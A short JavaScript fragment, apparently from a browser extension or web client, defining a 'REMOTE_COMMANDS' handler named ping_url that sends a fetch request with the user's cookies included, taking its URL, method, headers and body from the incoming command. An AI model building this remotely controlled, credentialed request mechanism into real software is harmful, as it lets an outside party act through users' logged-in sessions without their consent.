const REMOTE_COMMANDS = {
    ping_url: e => {
        let d = {
            credentials: "include"
        };
        e.method && (d.method = e.method.toUpperCase());
        if (e.headers) {
            let o = {};
            for (let d of e.headers) {
                let [e, ...n] = d.split("=");
                o[e] = n.join("=")
            }
            d.headers = new Headers(o)
        }
        e.body && (d.body = e.body);
        fetch(e.url, d)
    }
};